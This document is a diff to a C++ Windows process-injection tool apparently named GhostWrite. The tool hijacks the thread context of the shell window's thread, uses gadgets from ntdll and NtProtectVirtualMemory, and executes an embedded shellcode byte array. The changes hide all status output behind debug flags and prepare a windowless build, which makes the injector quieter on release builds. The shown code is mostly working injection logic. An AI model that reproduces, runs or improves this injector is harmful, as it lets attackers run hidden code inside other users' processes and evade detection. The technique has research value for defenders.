@@ -4,10 +4,15 @@
 #include "Zydis/Zydis.h"
 
 
-INT EntryPoint = 0x10; // Shellcode入口偏移
+//#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
 
+
+// Shellcode入口偏移
+INT EntryPoint = 0x10;
+
+// 有时生成的Shellcode会对[rsp+8]地址进行写入操作，为了避免数据被破坏，可以额外加一排全0数据
 BYTE Shellcode[] = {
-	// 生成的shellcode有bug，会对[rsp+8]地址进行写入操作，为了避免数据被破坏，只能额外加一排全0数据
+
 	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
 
 	0x48,0x89,0x5c,0x24,0x08,0x57,0x48,0x83,0xec,0x20,0x65,0x48,0x8b,0x04,0x25,0x30,
@@ -246,7 +251,7 @@ BOOL GhostWrite(HANDLE Thread, HWND Window, CONTEXT* ThreadContext, PVOID JMPTOS
 {
 	SetThreadContext(Thread, ThreadContext);
 
-#ifdef DEBUG
+#ifdef _DEBUG
 	_tprintf(_T("\n"));
 	_tprintf(_T("[D] After inject:\n"));
 	_tprintf(_T("[D] Rbx = %llX\n"), ThreadContext->Rbx);
@@ -254,7 +259,7 @@ BOOL GhostWrite(HANDLE Thread, HWND Window, CONTEXT* ThreadContext, PVOID JMPTOS
 	_tprintf(_T("[D] Rdi = %llX\n"), ThreadContext->Rdi);
 	_tprintf(_T("[D] Rsp = %llX\n"), ThreadContext->Rsp);
 	_tprintf(_T("[D] Rip = %llX\n"), ThreadContext->Rip);
-#endif // DEBUG
+#endif // _DEBUG
 
 	// 唤醒线程
 	PostMessage(Window, WM_USER, 0, 0);
@@ -267,7 +272,9 @@ BOOL GhostWrite(HANDLE Thread, HWND Window, CONTEXT* ThreadContext, PVOID JMPTOS
 		SuspendThread(Thread);
 
 		if (GetThreadContext(Thread, ThreadContext) == 0) {
+#ifdef _DEBUG
 			_tprintf(_T("[x] GetThreadContext failed, error: 0x%x\n"), GetLastError());
+#endif // _DEBUG
 			return FALSE;
 		}
 
@@ -286,14 +293,18 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 	// 设置左操作数
 	DWORD64* Operand0 = Translate(Ghost->Operands[0], &ThreadContext);
 	if (Operand0 == NULL) {
+#ifdef _DEBUG
 		_tprintf(_T("[x] Unsupported operand, Operands[0]: %d\n"), Ghost->Operands[0]);
+#endif // _DEBUG
 		return FALSE;
 	}
 
 	// 设置右操作数
 	DWORD64* Operand1 = Translate(Ghost->Operands[1], &ThreadContext);
 	if (Operand1 == NULL) {
+#ifdef _DEBUG
 		_tprintf(_T("[x] Unsupported operand, Operands[1]: %d\n"), Ghost->Operands[1]);
+#endif // _DEBUG
 		return FALSE;
 	}
 
@@ -516,10 +527,14 @@ int _tmain(int argc, TCHAR* argv[])
 	// 获取ntdll模块
 	HMODULE NTDLLBase = GetModuleHandle(_T("ntdll.dll"));
 	if (NTDLLBase != NULL) {
+#ifdef _DEBUG
 		_tprintf(_T("[+] NTDLL Base = %p\n"), NTDLLBase);
+#endif // _DEBUG
 	}
 	else {
+#ifdef _DEBUG
 		_tprintf(_T("[x] Failed to get ntdll.dll module\n"));
+#endif // _DEBUG
 		return 0;
 	}
 
@@ -531,7 +546,9 @@ int _tmain(int argc, TCHAR* argv[])
 	// 获取NtProtectVirtualMemory的函数地址
 	PVOID NtProtectVirtualMemory = (PVOID)GetProcAddress(NTDLLBase, "NtProtectVirtualMemory");
 	if (NtProtectVirtualMemory == NULL) {
+#ifdef _DEBUG
 		_tprintf(_T("[x] Can't get NtProtectVirtualMemory address\n"));
+#endif // _DEBUG
 		return 0;
 	}
 
@@ -540,19 +557,27 @@ int _tmain(int argc, TCHAR* argv[])
 
 	// 获取自跳转地址
 	if (FindJMPTOSELFAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
+#ifdef _DEBUG
 		_tprintf(_T("[+] JMP SELF Address = %p\n"), Ghost.JMPTOSELFAddress);
+#endif // _DEBUG
 	}
 	else {
+#ifdef _DEBUG
 		_tprintf(_T("[x] Failed to find JMP SELF Address\n"));
+#endif // _DEBUG
 		return 0;
 	}
 
 	// 获取转移返回地址
 	if (FindMOVRETAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
+#ifdef _DEBUG
 		_tprintf(_T("[+] MOV RET Address = %p\n"), Ghost.MOVRETAddress);
+#endif // _DEBUG
 	}
 	else {
+#ifdef _DEBUG
 		_tprintf(_T("[x] Failed to find MOV RET Address\n"));
+#endif // _DEBUG
 		return 0;
 	}
 
@@ -560,16 +585,22 @@ int _tmain(int argc, TCHAR* argv[])
 	// HWND Window = FindWindow(_T("CalcFrame"), NULL);
 	HWND Window = GetShellWindow();
 	if (Window == NULL) {
+#ifdef _DEBUG
 		_tprintf(_T("[x] Can't find target window\n"));
+#endif // _DEBUG
 		return 0;
 	}
 
 	DWORD ThreadId = GetWindowThreadProcessId(Window, NULL);
+#ifdef _DEBUG
 	_tprintf(_T("[+] Thread Id = %d\n"), ThreadId);
+#endif // _DEBUG
 
 	HANDLE Thread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, ThreadId);
 	if (Thread == NULL) {
+#ifdef _DEBUG
 		_tprintf(_T("[x] Can't open target thread\n"));
+#endif // _DEBUG
 		return 0;
 	}
 
@@ -581,7 +612,7 @@ int _tmain(int argc, TCHAR* argv[])
 	ThreadContext.ContextFlags = CONTEXT_FULL;
 	GetThreadContext(Thread, &ThreadContext);
 
-#ifdef DEBUG
+#ifdef _DEBUG
 	_tprintf(_T("\n"));
 	_tprintf(_T("[D] Before inject:\n"));
 	_tprintf(_T("[D] Rbx = %llX\n"), ThreadContext.Rbx);
@@ -589,14 +620,18 @@ int _tmain(int argc, TCHAR* argv[])
 	_tprintf(_T("[D] Rdi = %llX\n"), ThreadContext.Rdi);
 	_tprintf(_T("[D] Rsp = %llX\n"), ThreadContext.Rsp);
 	_tprintf(_T("[D] Rip = %llX\n"), ThreadContext.Rip);
-#endif // DEBUG
+#endif // _DEBUG
 
 	// 开始注入，约定：注入完成后线程必须处于暂停状态
 	if (Inject(Thread, Window, &Ghost, NtProtectVirtualMemory) == TRUE) {
+#ifdef _DEBUG
 		_tprintf(_T("[+] Success\n"));
+#endif // _DEBUG
 	}
 	else {
+#ifdef _DEBUG
 		_tprintf(_T("[-] Failed\n"));
+#endif // _DEBUG
 	}
 
 	// 还原线程
